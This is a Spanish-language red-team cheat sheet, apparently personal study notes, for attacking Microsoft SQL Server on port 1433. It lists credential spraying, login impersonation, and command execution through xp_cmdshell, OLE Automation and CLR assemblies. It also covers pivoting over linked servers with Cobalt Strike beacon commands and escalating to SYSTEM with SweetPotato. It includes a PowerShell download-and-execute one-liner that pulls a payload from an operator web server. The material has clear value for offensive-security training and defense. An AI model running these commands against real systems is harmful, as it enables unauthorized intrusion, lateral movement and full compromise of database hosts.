---
tags: [ports, mssql, database, cobalt-strike, privesc]
status: completo
---

# 1433 — MSSQL

---

## Conectar

```bash
impacket-mssqlclient dominio/usuario:contraseña@<IP> -windows-auth
impacket-mssqlclient 'dominio/usuario':'contraseña'@<IP> -dc-ip <DC_IP> -windows-auth

# Spray de credenciales
nxc mssql <IP> -u usuarios.txt -p contraseñas.txt --local-auth
```

---

## Enumeración

### SQL (impacket / sqlcmd)

```sql
-- Mostrar todas las BBDDs
SELECT name FROM sys.databases;

-- BBDD actual
SELECT DB_NAME();

-- Listar usuarios del servidor
SELECT name FROM master.sys.server_principals;

-- Ver si podemos impersonar usuarios
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonar usuario
EXECUTE AS LOGIN = 'usuario_objetivo';

-- Listar tablas de una BBDD
SELECT * FROM nombre_bbdd.INFORMATION_SCHEMA.TABLES;
```

### Cobalt Strike (SQL-BOF)

```
# Descubrir instancias via SPNs de Kerberos
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

# Escaneo de puertos
beacon> portscan 10.10.120.0/23 1433 arp 1024

# Info del servidor (requiere SQLBrowser en 1434/UDP)
beacon> sql-1434udp <IP>

# Info detallada (requiere rol public)
beacon> sql-info <host>

# Permisos del usuario actual
beacon> sql-whoami <host>

# Query personalizada
beacon> sql-query <host> "SELECT @@SERVERNAME"

# Listar BBDDs, tablas, columnas
beacon> sql-databases <host>
beacon> sql-tables <host>
beacon> sql-columns <host>
beacon> sql-search <host>   # buscar columnas por keyword
```

---

## RCE

### xp_cmdshell (devuelve output)

```sql
-- Verificar estado
EXEC sp_configure 'xp_cmdshell';
-- value=0 → deshabilitado

-- Habilitar (requiere sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Ejecutar
EXEC xp_cmdshell 'whoami';
```

```
# Cobalt Strike
beacon> sql-query <host> "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
beacon> sql-enablexp <host>
beacon> sql-xpcmd <host> "hostname && whoami"
beacon> sql-disablexp <host>   # limpiar después
```

### OLE Automation (sin output, one-liners)

```
beacon> sql-query <host> "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
beacon> sql-enableole <host>

# Ejecutar one-liner (útil con reverse port forward hacia CS web server)
beacon> sql-olecmd <host> "cmd /c powershell -w hidden -nop -enc <BASE64>"

beacon> sql-disableole <host>   # limpiar
```

```powershell
# Generar one-liner base64
$cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

### SQL CLR (C# assembly — más flexible)

```
beacon> sql-query <host> "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
beacon> sql-enableclr <host>

beacon> sql-clr <host> C:\path\to\assembly.dll MyProcedure

beacon> link <host> <PIPE>
beacon> sql-disableclr <host>   # limpiar
```

> CLR permite shellcode injection, spawning procesos, cualquier código .NET arbitrario.

---

## Linked Servers

```sql
-- Ver servidores enlazados (SQL)
SELECT * FROM sys.servers;

-- Ejecutar en servidor enlazado (SQL)
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [SERVIDOR_ENLAZADO];
```

```
# Cobalt Strike
beacon> sql-links <host>                          # enumerar links
beacon> sql-query <host> "SELECT @@SERVERNAME" "" <linked-server>   # query en linked server
beacon> sql-whoami <host> "" <linked-server>      # permisos en linked server

# RPC Out (necesario para stored procedures en linked server)
beacon> sql-checkrpc <host>
beacon> sql-enablerpc <host> <linked-server>

# RCE a través del link
beacon> sql-clr <host> C:\path\assembly.dll MyProcedure "" <linked-server>
beacon> link <linked-host> <PIPE>
```

> El contexto de seguridad en el linked server depende de cómo está configurado el link (credenciales hardcodeadas, hereda sesión actual, etc.)

---

## Privilege Escalation — SeImpersonatePrivilege

Los servicios MSSQL suelen correr como `NT Service\MSSQLSERVER` — cuenta local virtual con acceso a red como la cuenta de máquina, pero sin admin local. Sin embargo suelen tener **SeImpersonatePrivilege**.

```
beacon> getuid
# [*] You are NT Service\MSSQLSERVER

beacon> whoami /priv   # o Seatbelt para ver token privileges
```

**SweetPotato** — crea un named pipe, coerciona un proceso SYSTEM a conectarse, impersona su token y lanza un proceso como SYSTEM.

```
beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\tcp-local_x64.exe
beacon> execute-assembly SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
beacon> connect localhost 1337
# [+] established link to child beacon
```

> También aplica en cuentas de servicios IIS y otros servicios de Windows.

---

## Ver también

- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]] — `mssql_svc` suele ser kerberoasteable
- [[05-ad-attacks/kerberos/lateral-movement-services-(cs)|Lateral Movement Services (CS)]] — moverse desde el beacon de MSSQL
